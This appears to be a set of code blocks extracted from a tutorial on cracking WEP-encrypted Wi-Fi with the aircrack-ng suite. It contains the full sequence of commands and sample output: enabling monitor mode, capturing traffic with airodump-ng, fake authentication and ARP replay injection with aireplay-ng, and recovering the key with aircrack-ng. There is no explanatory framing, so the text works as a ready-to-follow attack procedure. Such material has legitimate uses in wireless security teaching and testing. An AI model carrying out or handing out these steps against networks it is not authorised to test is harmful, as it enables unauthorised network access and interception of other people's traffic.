["```\n ifconfig <adapter name> down\n```", "```\n iwconfig <adapter name> mode monitor\n```", "```\n ifconfig <adapter name> up\n```", "```\n airodump-ng <adapter name> \n```", "```\nairmon-ng \n```", "```\nairodump-ng mon0 \n```", "```\nairodump-ng <wireless interface name)\n```", "```\naireplay-ng --arpreplay -b <target BSSID> -h <MAC address of connected client> <interface name> \n```", "```\n Saving ARP requests in replay_arp-1001.cap \n```", "```\n Read 2493 packets (got 1 ARP requests), sent 1305 packets...\n```", "```\n aireplay-ng -2 -r replay_arp-1001.cap ath0                        \n```", "```\n Size: 86, FromDS: 0, ToDS: 1 (WEP) \n\n           BSSID  =  00:14:6C:7E:40:80 \n       Dest. MAC  =  FF:FF:FF:FF:FF:FF \n      Source MAC  =  00:0F:B5:88:AC:82 \n\n      0x0000:  0841 0000 0014 6c7e 4080 000f b588 ac82  .A....l~@....... \n      0x0010:  ffff ffff ffff 7092 e627 0000 7238 937c  ......p..'..r8.| \n      0x0020:  8011 36c6 2b2c a79b 08f8 0c7e f436 14f7  ..6.+,.....~.6.. \n      0x0030:  8078 a08e 207c 17c6 43e3 fe8f 1a46 4981  .x.. |..C....FI. \n      0x0040:  947c 1930 742a c85f 2699 dabe 1368 df39  .|.0t*._&....h.9 \n      0x0050:  ca97 0d9e 4731                           ....G1 \n\n      Use this packet ? y \n      You say \"y\" and then your system will start injecting: \n\n      Saving chosen packet in replay_src-0219-123117.cap \n      You should also start airodump-ng to capture replies. \n\n      Sent 3181 packets... \n```", "```\n The system will respond: \n\n     Interface       Chipset         Driver \n\n     Wlan0           Atheros         madwifi-ng \n     ath0            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode \n     enabled) \n```", "```\n lo        no wireless extensions. \n\n Wlan0     no wireless extensions. \n\n eth0      no wireless extensions. \n\n ath0      IEEE 802.11g  ESSID:\"\"  Nickname:\"\" \n        Mode:Monitor  Frequency:2.452 GHz  Access Point: 00:0F:B5:88:AC:82    \n        Bit Rate:0 kb/s   Tx-Power:18 dBm   Sensitivity=0/3   \n        Retry:off   RTS thr:off   Fragment thr:off \n        Encryption key:off \n        Power Management:off \n        Link Quality=0/94  Signal level=-95 dBm  Noise level=-95 dBm \n        Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0 \n        Tx excessive retries:0  Invalid misc:0   Missed beacon:0 \n```", "```\naireplay-ng -9 -e ganon -a 00:28:6C:E4:40:80 wlan0\n```", "```\n 09:23:35  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 9 \n 09:23:35  Trying broadcast probe requests... \n 09:23:35  Injection is working! \n 09:23:37  Found 1 AP  \n\n 09:23:37  Trying directed probe requests... \n 09:23:37  00:28:6C:E4:40:80  - channel: 9 - 'ganon' \n 09:23:39  Ping (min/avg/max): 1.827ms/68.145ms/111.610ms Power: 33.73 \n 09:23:39  30/30: 100% \n```", "```\nairodump-ng -c 9 --bssid 00:28:6C:E4:40:80 -w output wlan0 \n--bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminate extraneous traffic. \n-w capture is file name prefix for the file which will contain the IVs. \n```", "```\n CH  9 ][ Elapsed: 8 mins ][ 2007-03-21 19:25  \n\n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID \n\n 00:14:6C:7E:40:80   42 100     5240   178307  338   9  54  WEP  WEP         teddy                            \n\n BSSID              STATION            PWR  Lost  Packets  Probes                                              \n\n 00:14:6C:7E:40:80  00:0F:B5:88:AC:82   42     0   183782 \n```", "```\naireplay-ng -1 0 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0\n```", "```\n18:18:20  Sending Authentication Request \n18:18:20  Authentication successful \n18:18:20  Sending Association Request \n18:18:20  Association successful :-) \n```", "```\naireplay-ng -1 6000 -o 1 -q 10 -e ganon -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0\n```", "```\n18:22:32  Sending Authentication Request \n18:22:32  Authentication successful \n18:22:32  Sending Association Request \n18:22:32  Association successful :-) \n18:22:42  Sending keep-alive packet \n18:22:52  Sending keep-alive packet \n# and so on. \n```", "```\n18:28:02  Sending Authentication Request \n18:28:02  Authentication successful \n18:28:02  Sending Association Request \n18:28:02  Association successful :-) \n18:28:02  Got a deauthentication packet! \n18:28:05  Sending Authentication Request \n18:28:05  Authentication successful \n18:28:05  Sending Association Request \n18:28:10  Sending Authentication Request \n18:28:10  Authentication successful \n18:28:10  Sending Association Request \n```", "```\naireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0\n```", "```\n Saving ARP requests in replay_arp-2017.cap \n You should also start airodump-ng to capture replies. \n Read 629399 packets (got 316283 ARP requests), sent 210955 packets... \n```", "```\naircrack-ng -b 00:14:6C:7E:40:80 output*.cap\n```", "```\n Aircrack-ng 0.9 \n\n                              [00:03:06] Tested 674449 keys (got 96610 IVs) \n\n KB    depth   byte(vote) \n  0    0/  9   12(  15) F9(  15) 47(  12) F7(  12) FE(  12) 1B(   5) 77(   5) A5(   3) F6(   3) 03(   0)  \n  1    0/  8   34(  61) E8(  27) E0(  24) 06(  18) 3B(  16) 4E(  15) E1(  15) 2D(  13) 89(  12) E4(  12)  \n  2    0/  2   56(  87) A6(  63) 15(  17) 02(  15) 6B(  15) E0(  15) AB(  13) 0E(  10) 17(  10) 27(  10)  \n  3    1/  5   78(  43) 1A(  20) 9B(  20) 4B(  17) 4A(  16) 2B(  15) 4D(  15) 58(  15) 6A(  15) 7C(  15)  \n\n                       KEY FOUND! [ 12:34:56:78:90 ]  \n      Probability: 100% \n```"]